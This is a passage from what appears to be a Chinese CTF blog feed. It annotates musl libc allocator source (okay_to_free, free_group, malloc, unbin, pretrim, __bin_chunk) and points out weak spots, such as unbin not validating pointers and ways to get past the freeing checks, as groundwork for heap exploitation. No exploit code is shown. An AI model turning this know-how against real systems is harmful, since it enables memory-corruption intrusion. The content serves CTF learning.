class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">okay_to_free</span><span class="params">(struct meta *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// always free individual mmaps not suitable for reuse</span></span><br><span class="line"><span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT*size_classes[sc])</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// always free groups allocated inside another group&#x27;s slot</span></span><br><span class="line"><span class="comment">// since recreating them should not be expensive and they</span></span><br><span class="line"><span class="comment">// might be blocking freeing of a much larger group.</span></span><br><span class="line"><span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if there is another non-full group, free this one to</span></span><br><span class="line"><span class="comment">// consolidate future allocations, reduce fragmentation.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// free any group in a size class that&#x27;s not bouncing</span></span><br><span class="line"><span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> cnt = g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"></span><br><span class="line"><span class="comment">// if usage is high enough that a larger count should be</span></span><br><span class="line"><span class="comment">// used, free the low-count group so a new one will be made.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">9</span>*cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// otherwise, keep the last group in a bouncing class.</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要返回的结果不为0即可，所以对照上面的图片即可看到很轻松也是可以绕过的，最后则是里面的assert的不大于48，也是很简单就绕过了。但是在实验期间发现了一个新的检测，我把maplen删掉了之后出现了崩溃的情况，查看源码发现，maplen =0 表示group 不是新mmap 出来的在size_classes里，meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">free_group</span><span class="params">(struct meta *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">step_seq();</span><br><span class="line">record_seq(sc);</span><br><span class="line">mi.base = g-&gt;mem;</span><br><span class="line">mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">void</span> *p = g-&gt;mem;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line"><span class="keyword">int</span> idx = get_slot_index(p);</span><br><span class="line">g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">mi = nontrivial_free(m, idx);</span><br><span class="line">&#125;</span><br><span class="line">free_meta(g);</span><br><span class="line"><span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码这里也验证了，如果置为0就会进一步进行free，在get_meta就可会出现崩溃。其实在get_meta函数内存在很多assert都可以看一下，这里就不过多赘述了。</p><hr><p>参考链接：</p><p><a class="link"   href="https://xz.aliyun.com/t/10326" >https://xz.aliyun.com/t/10326<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://eqqie.cn/" >https://eqqie.cn/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h2&gt;&lt;h3 id=&quot;数据结构&quot;&gt;&lt;a href=&quot;#数据结构&quot; class=&quot;headerlink&quot; title=&quot;数据结构&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="musl" scheme="https://cv196082.gitee.io/tags/musl/"/>
    
  </entry>
  
  <entry>
    <title>musl 1.1.24利用方式</title>
    <link href="https://cv196082.gitee.io/2022/04/27/musl-1-1-24%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
    <id>https://cv196082.gitee.io/2022/04/27/musl-1-1-24%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</id>
    <published>2022-04-27T12:35:56.000Z</published>
    <updated>2022-05-09T06:33:11.745Z</updated>
    
    <content type="html"><![CDATA[<p>这个月干的是属实有点儿少，感觉特别迷茫，学了那么多结果比赛还是一头雾水，虽然很烦躁但是还是不能放弃啊！</p><p>在starCTF的第二道题我始终找不到漏洞点在哪，下来看wp才发现使用的libc不是普通的glibc了，其实在RCTF的一道题目就是基于musl的但是无奈github的仓库当中并没有题目的源码所以没去深入了解，在starCTF过后也算是了解一下这一相较于glic更为轻量的libc了。</p><p>首先本文先介绍一下这一libc</p><h2 id="musl-1-1-24"><a href="#musl-1-1-24" class="headerlink" title="musl 1.1.24"></a>musl 1.1.24</h2><p>musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 Alpine Linux（做过 Docker 镜像的应该很熟悉）、OpenWrt（常用于路由器）和 Gentoo 等。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>这一版本的chunk结构其实是和glibc相差不大的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>psize和csize字段都有标志位（glibc 只有size字段有），但只有一种位于最低位的标志位INUSE（glibc 最低三位都有标志位）。若设置INUSE标志位（最低位为1），表示 chunk 正在被使用；若没有设置INUSE标志位（最低位为0），表示 chunk 已经被释放或者通过mmap分配的，需要通过psize的标志位来进一步判断 chunk 的状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure><p>这个mal结构体很类似main_arena，里面记录着堆的信息，有三个成员：64位无符号整数binmap、链表头部数组bins和锁free_lock。binmap记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>bin 链表头部的结构如上。head和tail指针分别指向首部和尾部的 chunk，同时首部 chunk 的prev指针和尾部 chunk 的next指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，head和tail指针等于 0 或者指向链表头部自身。</p><p>看mal结构可以看到有64的bin，前面32个bin是类似于small bin的结构，存放的chunk的大小是固定的，但是后面的就类似于large bin存放的是在一定范围的chunk了。</p><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/malloc/malloc.c L284-L331</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. n 增加头部长度 OVERHEAD (0x10)，对齐 32 位：</span></span><br><span class="line">    <span class="comment">// *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;</span></span><br><span class="line">    <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 n 到达 MMAP_THRESHOLD (0x38000)，使用 mmap chunk</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">        [...]</span><br><span class="line">        <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 计算 n 对应的 bin 下标 i</span></span><br><span class="line">    i = bin_index_up(n);</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 3. 查找 binmap</span></span><br><span class="line">        <span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        <span class="comment">// 若所有的可用 bin 均为空，调用 expand_heap 函数延展堆空间，生成新的 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">            c = expand_heap(n);</span><br><span class="line">            [...]</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. 获取大小最接近 n 的可用 bin 下标 j</span></span><br><span class="line">        j = first_set(mask);</span><br><span class="line">        lock_bin(j);</span><br><span class="line">        c = mal.bins[j].head; <span class="comment">// c 是 bin j 链表首部的 chunk</span></span><br><span class="line">        <span class="comment">// 5. 若符合条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c</span></span><br><span class="line">        <span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">            unlock_bin(j);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        unlock_bin(j);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 回收 c 中大小超过 n 的部分</span></span><br><span class="line">    <span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    trim(c, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概步骤就是：</p><ol><li><p>调整n，增加头部的长度然后对齐32位</p></li><li><p>如果n&gt;MMAP_THRESHOLD，则使用mmap创建一块大小为n的内存返回</p></li><li><p>如果n&lt;=MMAP_THRESHOLD，计算n对应的bin的i，查找binmap</p><p>​    如果所有可用bin都为空，那么就扩展堆空间，生存一个新的chunk</p><p>​    如果存在非空的bin，则大小最接近n的bin，将bin首部的chunk返回</p><p>​        如果符号pretrime条件，使用pretrime分割</p><p>​        否则使用unbin从链表中取出</p><p>​    最后对chunk进行trim，返回给用户</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 若 bin 只有一个 chunk，将 bin 设为空 bin</span></span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">// 取出链表中的 chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// 设置 INUSE 标志位</span></span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其实就是取出chunk的一个操作，可以看到取出的过程中并没有检测chunk指针的合法性，这也就造成了安全隐患</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pretrim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> n1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件 1: bin j 下标大于 40</span></span><br><span class="line">    <span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 条件 2: bin j 与 i 相隔 3 个 bin 或以上，</span></span><br><span class="line">    <span class="comment">// 或者 j 等于 63 且 split 的大小大于 MMAP_THRESHOLD</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        n1 = CHUNK_SIZE(self);</span><br><span class="line">        <span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        n1 = CHUNK_SIZE(self);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 条件 3: split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin</span></span><br><span class="line">    <span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切割出一块大小为 n 的 chunk</span></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;prev = self-&gt;prev;</span><br><span class="line">    split-&gt;next = self-&gt;next;</span><br><span class="line">    split-&gt;prev-&gt;next = split;</span><br><span class="line">    split-&gt;next-&gt;prev = split;</span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1-n;</span><br><span class="line">    next-&gt;psize = n1-n;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pretrim的作用是切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件时，pretrim从 bin 链表首部 chunk 切割出一块大小刚好符合需求的小 chunk，然后将小 chunk 分配给用户，链表首部 chunk 的位置保持不变。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件：self 的大小 n1 多于 n DONTCARE (0x10) 字节</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 self 的大小切割为 n，剩余部分成为新的 chunk split</span></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">    next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 split 释放到 bin</span></span><br><span class="line">    __bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc 的最后一步是trim，主要作用是回收 chunk 超过需求大小的部分。trim将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或者 double free</span></span><br><span class="line">    <span class="comment">// #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line">    <span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">        unmap_chunk(self);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        __bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unmap_chunk</span><span class="params">(struct chunk *self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> extra = self-&gt;psize;</span><br><span class="line">    <span class="keyword">char</span> *base = (<span class="keyword">char</span> *)self - extra;</span><br><span class="line">    <span class="keyword">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">    <span class="comment">// 若 prev size 设置了 INUSE 标志位，视为 double free，crash</span></span><br><span class="line">    <span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    __munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free 先对 chunk 进行 mmap / double free 检查。如果 chunk 的csize字段没有设置INUSE标志位，进入unmap_chunk函数检查psize字段。如果psize字段设置了INUSE标志位，视为 double free，crash；否则视为 mmap chunk，调用__munmap函数释放。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">    <span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">    <span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小</span></span><br><span class="line">    final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若下一个 chunk 的 psize 不等于 self 的 csize，则 crash</span></span><br><span class="line">    <span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">    <span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 检查 self 前后是否有空闲 chunk</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">// 去除 INUSE 标志位</span></span><br><span class="line">            self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">            next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">            <span class="comment">// 计算 final_size 对应的 bin 下标 i</span></span><br><span class="line">            i = bin_index(final_size);</span><br><span class="line">            lock_bin(i);</span><br><span class="line">            lock(mal.free_lock);</span><br><span class="line">            <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">                <span class="keyword">break</span>;  <span class="comment">// 退出循环</span></span><br><span class="line">            unlock(mal.free_lock);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向前合并空闲 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (alloc_rev(self)) &#123;  <span class="comment">// 从 bin 链表取出待合并的空闲 chunk</span></span><br><span class="line">            self = PREV_CHUNK(self);</span><br><span class="line">            size = CHUNK_SIZE(self);</span><br><span class="line">            final_size += size;</span><br><span class="line">            <span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">                reclaim = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向后合并空闲 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (alloc_fwd(next)) &#123;  <span class="comment">// 从 bin 链表取出待合并的空闲 chunk</span></span><br><span class="line">            size = CHUNK_SIZE(next);</span><br><span class="line">            final_size += size;</span><br><span class="line">            <span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">                reclaim = <span class="number">1</span>;</span><br><span class="line">            next = NEXT_CHUNK(next);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 在 binmap 中，将 bin i 设为非空 bin</span></span><br><span class="line">    <span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">        a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">    self-&gt;csize = final_size;</span><br><span class="line">    next-&gt;psize = final_size;</span><br><span class="line">    unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span 